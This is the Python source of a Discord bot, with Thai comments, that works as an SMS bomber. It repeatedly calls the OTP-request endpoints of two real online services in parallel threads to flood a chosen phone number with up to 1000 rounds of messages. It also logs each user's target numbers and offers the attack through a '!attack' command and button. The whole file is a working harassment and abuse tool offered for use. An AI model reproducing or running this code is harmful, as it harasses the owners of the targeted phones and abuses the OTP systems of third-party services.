import nextcord
import requests
import threading
import datetime
from nextcord.ext import commands
from nextcord import Interaction
max = 1000  # จำนวนสูงสุดการยิงเบอร์
token = ''  # โทเค็นบอท
admin = 'stephencurry7368'  # ชื่อแอดมิน

intents = nextcord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

def api3(target):
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
        }
        r = requests.post('https://api-sso.ch3plus.com/user/request-otp', headers=headers, json={'tel': target, 'type': 'register'})
        if r.status_code == 200 or r.status_code == 201:
            print(f"✅ ยิง 3Plus ไปที่ {target} สำเร็จ")
    except:
        pass

def api_pangsky(target):
    try:
        da = datetime.datetime.now()
        ok = da.strftime("%H:%M:%S")
        r = requests.post("https://dso.panggame.com/1/verify/send", headers={"content-type": "application/json;charset=UTF-8", "user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"}, json={"verify_source": 1, "verify_type": 1, "phone": f"{target[1:]}", "areacode": "66"})
        if r.status_code == 200 or r.status_code == 201:
            print(f"🎯 ยิง Pangsky ไปที่ {target} สำเร็จ")
    except:
        pass

def run(phone, ammo):
    for _ in range(int(ammo)):
        # ยิงทั้ง 2 API พร้อมกัน
        threading.Thread(target=api3, args=[str(phone)]).start()
        threading.Thread(target=api_pangsky, args=[str(phone)]).start()

class SPAM(nextcord.ui.Modal):
    def __init__(self):
        super().__init__(title='✨ 𝑩𝑿 𝑺𝑷𝑨𝑴 𝑺𝑴𝑺 𝑼𝑷𝑫𝑨𝑻𝑬  🦋')
        self.x = nextcord.ui.TextInput(
            label='📱 𝑬𝒏𝒕𝒆𝒓 𝑷𝒉𝒐𝒏𝒆 𝑵𝒖𝒎𝒃𝒆𝒓',
            max_length=1000,
            placeholder='Enter the target phone number...',
            required=True
        )
        self.ammo = nextcord.ui.TextInput(
            label=f'💣 𝑵𝒖𝒎𝒃𝒆𝒓 𝒐𝒇 𝑺𝑴𝑺 (max {max})',
            placeholder='Enter the number of SMS to send...',
            required=True,
            max_length=5
        )
        self.add_item(self.x)
        self.add_item(self.ammo)

    async def callback(self, interaction: nextcord.Interaction):
        try:
            int(self.ammo.value)
        except ValueError:
            embed = nextcord.Embed(
                title='❌ Error',
                description=f'รูปแบบขจำนวนของคุณไม่ถูกต้อง ต้องเป็นจำนวนเต็ม init เท่านั้น!',
                color=0xff0a16
            )
            return await interaction.response.send_message(embed=embed, ephemeral=True)

        if int(self.ammo.value) > int(max):
            embed = nextcord.Embed(
                title='เกิดข้อผิดพลาด',
                description=f'จำนวนต้องไม่เกิน {max} นะครับ!',
                color=0xff0a16
            )
            return await interaction.response.send_message(embed=embed, ephemeral=True)

        with open(f'{interaction.user.name}.txt', 'a+') as user:
            user.write(f'{self.x.value}\n')

        actual_sms = int(self.ammo.value) * 2  # 2 APIs
        embed = nextcord.Embed(
            title='✅ Success! 🎉',
            description=f'🚀 Started spamming SMS to: {self.x.value} for {self.ammo.value} rounds\n(Approximately {actual_sms} SMS)! 💣\nPlease wait while the system is working...',
            color=0x00ffff
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        run(self.x.value, self.ammo.value)

class SMSButton(nextcord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        self.cooldown = commands.CooldownMapping.from_cooldown(1, 30, commands.BucketType.member)

    @nextcord.ui.button(
        label=' 𝑺𝒕𝒂𝒓𝒕  ',
        style=nextcord.ButtonStyle.primary,
        emoji='💣'
    )
    async def spamsms(self, button, interaction: nextcord.Interaction):
        bucket = self.cooldown.get_bucket(interaction.message)
        retry = bucket.update_rate_limit()
        if retry:
            return await interaction.response.send_message(f'## กรุณารอ {round(retry)} วินาที', ephemeral=True)

        await interaction.response.send_modal(SPAM())

    @nextcord.ui.button(
        label='📜 SMS History',
        style=nextcord.ButtonStyle.grey
    )
    async def check(self, button, interaction: nextcord.Interaction):
        try:
            file = open(f'{interaction.user.name}.txt', 'r').read().splitlines()
            phone = '\n📞 Target Number: '.join(file)
            embed = nextcord.Embed(
                title='📜 Your SMS History',
                description=f'\n\n```Your SMS History\n📞 Target Number: {phone}```',
                color=0x00bfff
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
        except FileNotFoundError:
            embed = nextcord.Embed(
                title='ไม่สามารถเช็คประวัติได้',
                description=f'เนื่องจากคุณยังไม่ได้เคยยิงเบอร์ใครเลย กรุณายิงเบอร์ก่อน!',
                color=0xA8E6A1
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.event
async def on_ready():
    bot.add_view(SMSButton())
    print('  🌎 •      𝑩𝒐𝒕 𝑳𝒐𝒈𝒊𝒏 𝒄𝒐𝒎𝒑𝒍𝒆𝒕𝒆𝒅 🚀')
    print('  💣 •      𝑺𝒕𝒂𝒓𝒕 𝑩𝑿 𝑼𝑷𝑮𝑹𝑨𝑫𝑬  💥')
    print('  🦋 •      𝑫𝒊𝒔𝒄𝒓𝒐𝒅 𝑩𝒚 • 𝒔𝒖𝒌𝒓𝒊𝒕.𝒔𝒈𝒔 ')

    activity = nextcord.Activity(type=nextcord.ActivityType.playing, name="VIP✨ | !attack")
    await bot.change_presence(activity=activity)

@bot.command(name="attack")
async def attack(ctx):
    embed = nextcord.Embed(
        title='👑 𝑺𝒕𝒂𝒓𝒕 𝑩𝑿 𝑼𝑷𝑮𝑹𝑨𝑫𝑬 𝓢𝓟𝓐𝓜 𝓢𝓜𝓢🦋',
        description='```[+] ✨ 𝘾𝙡𝙞𝙘𝙠 𝙩𝙝𝙚 𝙗𝙪𝙩𝙩𝙤𝙣 𝙩𝙤 𝙨𝙩𝙖𝙧𝙩 𝙎𝙈𝙎 𝙗𝙤𝙢𝙗𝙞𝙣𝙜 𝙛𝙤𝙧 𝑺𝑮𝑺 \n[+]𝙔𝙤𝙪 𝙘𝙖𝙣 𝙘𝙝𝙚𝙘𝙠 𝙮𝙤𝙪𝙧 𝙎𝙈𝙎 𝙝𝙞𝙨𝙩𝙤𝙧𝙮  ```',
        color=0x00bfff
    )
    embed.set_image(url='https://i.postimg.cc/NF2PxxZG/IMG-2689.gif')
    await ctx.send(embed=embed, view=SMSButton())

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    await bot.process_commands(message)

if __name__ == "__main__":
    try:
        bot.run(token)
    except nextcord.errors.LoginFailure:
        print("โทเค็นไม่ถูกต้อง กรุณาตรวจสอบใหม่")
    except Exception as e:
        print(f"เกิดข้อผิดพลาด: {e}")
